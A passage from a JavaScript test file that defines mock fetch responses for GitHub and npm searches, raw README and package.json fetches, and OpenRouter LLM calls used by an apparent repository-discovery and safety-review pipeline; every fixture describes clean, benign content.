              updated_at: "2026-05-31T12:00:00Z",
              pushed_at: "2026-05-31T12:00:00Z"
            }
          ]
        }, 200, {
          etag: "\"vnem-rust-test-etag\""
        });
      }
      return jsonFetchResponse({
        total_count: 2,
        incomplete_results: false,
        items: [
          {
            id: 100,
            name: "basic-script-dump",
            full_name: "example/basic-script-dump",
            html_url: "https://github.com/example/basic-script-dump",
            description: "Small unrelated test repository.",
            owner: { login: "example" },
            default_branch: "main",
            stargazers_count: 1,
            forks_count: 0,
            language: "JavaScript",
            updated_at: "2026-01-01T00:00:00Z",
            pushed_at: "2026-01-01T00:00:00Z"
          },
          {
            id: 200,
            name: "vnem-agent-workflow",
            full_name: "ovvuh/vnem-agent-workflow",
            html_url: "https://github.com/ovvuh/vnem-agent-workflow",
            description: "Agentic workflow architecture for Luau prompt planning, MCP context routing, and benchmarked development loops.",
            owner: { login: "ovvuh" },
            default_branch: "main",
            stargazers_count: 420,
            forks_count: 36,
            language: "TypeScript",
            license: { spdx_id: "MIT" },
            updated_at: "2026-05-30T12:00:00Z",
            pushed_at: "2026-05-30T12:00:00Z"
          }
        ]
      }, 200, {
        etag: "\"vnem-test-etag\""
      });
    }
    if (target.startsWith("https://registry.npmjs.org/-/v1/search")) {
      const query = new URL(target).searchParams.get("text");
      assert.equal(query, "agentic workflow");
      return jsonFetchResponse({
        objects: [
          {
            package: {
              name: "tiny-unrelated-package",
              version: "0.0.1",
              description: "Small unrelated package.",
              keywords: ["misc"],
              date: "2026-01-01T00:00:00.000Z",
              links: {
                npm: "https://www.npmjs.com/package/tiny-unrelated-package"
              },
              publisher: { username: "example" },
              maintainers: [{ username: "example" }]
            },
            score: {
              final: 0.1,
              detail: {
                quality: 0.1,
                popularity: 0.1,
                maintenance: 0.1
              }
            },
            searchScore: 0.1
          },
          {
            package: {
              name: "vnem-agent-runner",
              version: "1.4.0",
              description: "Agentic workflow planning utilities for MCP context routing, code review loops, and benchmarked AI development.",
              keywords: ["agentic", "workflow", "mcp", "llm", "architecture"],
              date: "2026-05-29T00:00:00.000Z",
              links: {
                npm: "https://www.npmjs.com/package/vnem-agent-runner",
                repository: "https://github.com/ovvuh/vnem-agent-runner",
                homepage: "https://github.com/ovvuh/vnem-agent-runner#readme"
              },
              publisher: { username: "ovvuh" },
              maintainers: [{ username: "ovvuh" }]
            },
            score: {
              final: 0.92,
              detail: {
                quality: 0.91,
                popularity: 0.72,
                maintenance: 0.88
              }
            },
            searchScore: 0.96
          }
        ],
        total: 2,
        time: "2026-06-01T00:00:00.000Z"
      });
    }
    if (target === "https://raw.githubusercontent.com/bevyengine/bevy/main/README.md") {
      return textFetchResponse([
        "# Bevy",
        "",
        "A safe Rust ECS architecture reference for game development, scheduling, and renderer organization.",
        "No shell bootstrapper or lifecycle install script is required."
      ].join("\n"));
    }
    if (target === "https://raw.githubusercontent.com/bevyengine/bevy/main/package.json") {
      return textFetchResponse("not found", 404);
    }
    if (target === "https://raw.githubusercontent.com/ovvuh/vnem-agent-workflow/main/README.md") {
      return textFetchResponse([
        "# vnem-agent-workflow",
        "",
        "A safe architecture note for agentic workflow planning, Luau game automation review, and MCP routing.",
        "No runtime shell execution is required."
      ].join("\n"));
    }
    if (target === "https://raw.githubusercontent.com/ovvuh/vnem-agent-workflow/main/package.json") {
      return textFetchResponse(JSON.stringify({
        scripts: {
          test: "node scripts/test.js"
        },
        dependencies: {
          zod: "^4.0.0"
        }
      }, null, 2));
    }
    return textFetchResponse("not found", 404);
  };
  mockFetch.calls = calls;
  return mockFetch;
}

function createOpenRouterPipelineMockFetch() {
  const mockFetch = async (url, init = {}) => {
    const target = String(url);
    if (target.startsWith("https://api.github.com/search/repositories")) {
      return jsonFetchResponse({
        total_count: 1,
        incomplete_results: false,
        items: [
          {
            id: 900,
            name: "pipeline-core",
            full_name: "openrouter/pipeline-core",
            html_url: "https://github.com/openrouter/pipeline-core",
            description: "Agentic orchestration pipeline reference for LLM-backed research and safety review.",
            owner: { login: "openrouter" },
            default_branch: "main",
            stargazers_count: 200,
            forks_count: 12,
            language: "TypeScript",
            updated_at: "2026-06-01T00:00:00Z",
            pushed_at: "2026-06-01T00:00:00Z"
          }
        ]
      });
    }
    if (target.startsWith("https://raw.githubusercontent.com/")) {
      return textFetchResponse("Safe documentation. No lifecycle scripts, shell execution, or obfuscated payloads.");
    }
    if (target === "https://openrouter.ai/api/v1/chat/completions") {
      const body = JSON.parse(init.body);
      const system = body.messages?.[0]?.content ?? "";
      assert.deepEqual(body.response_format, { type: "json_object" });
      assert.equal(body.model, "nousresearch/hermes-3-llama-3.1-405b:free");
      if (system.includes("VNEM Research Core")) {
        return jsonFetchResponse({
          choices: [
            {
              message: {
                content: JSON.stringify({
                  title: "Hermes LLM Candidate",
                  description: "LLM-ranked research candidate for orchestration and production safety workflow improvements.",
                  source_route: "github-search",
                  candidate_score: 91
                })
              }
            }
          ]
        });
      }
      if (system.includes("VNEM Protection Guard")) {
        return jsonFetchResponse({
          choices: [
            {
              message: {
                content: JSON.stringify({
                  threat_score: 12,
                  flags: ["clean-metadata"]
                })
              }
            }
          ]
        });
      }
      if (system.includes("VNEM Giving Core")) {
        return jsonFetchResponse({
          choices: [
            {
              message: {
                content: JSON.stringify({
                  markdown: [
                    "# Hermes LLM Candidate",
                    "",
                    "## Discovery",
                    "Research Core ranked this candidate as useful for VNEM orchestration.",
                    "",
                    "## Safety",
                    "Protection Guard found clean metadata and no blocking lifecycle scripts.",
                    "",
                    "## Integration Plan",
                    "Stage the notes for maintainer review only."
                  ].join("\\n")
                })
              }
            }
          ]
        });
      }
    }
    return textFetchResponse("not found", 404);
  };
  return mockFetch;
}

function jsonFetchResponse(body, status = 200, headers = {}) {
  return {
    ok: status >= 200 && status < 300,
    status,
    headers: headerReader(headers),
    async json() {
      return body;
    },
    async text() {
      return JSON.stringify(body);
    }
  };
}

function textFetchResponse(body, status = 200, headers = {}) {
  return {
    ok: status >= 200 && status < 300,
    status,
    headers: headerReader(headers),
    async json() {
      return JSON.parse(body);
    },
    async text() {
      return body;
    }
  };
}

function headerReader(headers) {
  return {
    get(name) {
      return headers[String(name).toLowerCase()] ?? headers[name] ?? null;
    }
  };
}
